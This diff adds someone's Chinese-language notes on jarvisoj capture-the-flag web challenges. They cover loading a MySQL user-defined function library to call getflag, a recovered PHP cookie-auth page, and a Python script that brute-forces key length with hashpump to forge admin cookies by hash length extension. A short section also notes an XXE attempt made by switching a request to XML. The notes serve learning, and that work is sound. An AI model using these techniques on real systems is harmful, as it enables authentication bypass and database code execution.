@@ -1,5 +1,173 @@
 # web做题笔记
 
+## jarvisoj
+
+### re?
+
+看wp。
+
+百度一下发现udf(user defined function)是mysql的自定义函数
+
+所以要导入到mysql中。
+
+步骤
+
+```mysql
+> show variables like "%plugin%";
++---------------+------------------------+
+| Variable_name | Value                  |
++---------------+------------------------+
+| plugin_dir    | /usr/lib/mysql/plugin/ |
++---------------+------------------------+
+
+把 udf.so 移到该目录下
+
+> create function help_me returns string soname 'udf.so';
+> select help_me();
++---------------------------------------------+
+| help_me()                                   |
++---------------------------------------------+
+| use getflag function to obtain your flag!!  |
++---------------------------------------------+
+
+> create function getflag returns string soname 'udf.so';
+> select getflag();
++------------------------------------------+
+| getflag()                                |
++------------------------------------------+
+| PCTF{Interesting_U5er_d3fined_Function}  |
++------------------------------------------+
+
+> drop function help_me;
+> drop function getflag;
+```
+
+
+
+###  flag在管理员手上
+
+扫目录发现源代码的vim交换文件
+
+vim -r 还原
+
+得到
+
+```php
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>Web 350</title>
+<style type="text/css">
+        body {
+                background:gray;
+                text-align:center;
+        }
+</style>
+</head>
+
+<body>
+        <?php
+                $auth = false;
+                $role = "guest";
+                $salt =
+                if (isset($_COOKIE["role"])) {
+                        $role = unserialize($_COOKIE["role"]);
+                        $hsh = $_COOKIE["hsh"];
+                        if ($role==="admin" && $hsh === md5($salt.strrev($_COOKIE["role"]))) {
+                                $auth = true;
+                        } else {
+                                $auth = false;
+                        }
+                } else {
+                        $s = serialize($role);
+                        setcookie('role',$s);
+                        $hsh = md5($salt.strrev($s));
+                        setcookie('hsh',$hsh);
+                }
+                if ($auth) {
+                        echo "<h3>Welcome Admin. Your flag is 
+                } else {
+                        echo "<h3>Only Admin can see the flag!!</h3>";
+                }
+        ?>
+        
+</body>
+</html>
+
+```
+
+典型的哈希长度扩展攻击
+
+唯一不确定的就是密钥长度,写个脚本爆破
+
+```python
+#!/usr/bin/env python
+import os
+import requests
+import urllib
+def rev(s):
+	s=eval("'"+s+"'")
+	return urllib.quote(s[::-1])
+
+for i in range(128):
+	print(123)
+	tmp=os.popen("hashpump -s 3a4727d57463f122833d9e732f94e4e0 --data "+'\'s:5:"guest";\''[::-1]+' -a '+'\'s:5:"admin";\''[::-1]+" -k "+str(i)).readlines()
+	print("hashpump -s 3a4727d57463f122833d9e732f94e4e0 -d "+'\'s:5:"guest";\''[::-1]+' -a '+'s:5:"admin";'[::-1]+" -k "+str(i))
+	hsh=tmp[0].replace('\n','')
+	role=rev(tmp[1].replace('\n',''))
+	cookie={'hsh':hsh,'role':role}
+	text=requests.get("http://web.jarvisoj.com:32778/",cookies=cookie).text
+	if 'CTF' in text :
+		print(text)
+		break
+	print(cookie)
+
+```
+
+
+
+### apt调用
+
+请设法获得目标机器/home/ctf/flag.txt中的flag值。
+
+![image.png](https://i.loli.net/2019/10/08/DEJCarH2Wi8jsTF.png)
+
+
+
+点击按钮发生:
+
+```json
+function send(){
+ evil_input = document.getElementById("evil-input").value;
+ var xhr = XHR();
+     xhr.open("post","/api/v1.0/try",true);
+     xhr.onreadystatechange = function () {
+         if (xhr.readyState==4 && xhr.status==201) {
+             data = JSON.parse(xhr.responseText);
+             tip_area = document.getElementById("tip-area");
+             tip_area.value = data.task.search+data.task.value;
+         }
+     };
+     xhr.setRequestHeader("Content-Type","application/json");
+     xhr.send('{"search":"'+evil_input+'","value":"own"}');
+}
+```
+
+
+
+向这个api请求。想了半天,试各种非法输入,长度限制都没用,中间猜测xxe,,虽然有了思路但是却无从下手,看到flask又想到模板注入,还是无处下手
+
+
+
+最后看了wp,把请求头`Content-Type: application/json`改为
+
+`Content-Type: application/xml`来进行xxe,我也是醉了/fad
+
+
+
+
+
 ## ROIS
 
 ### base-lanauage
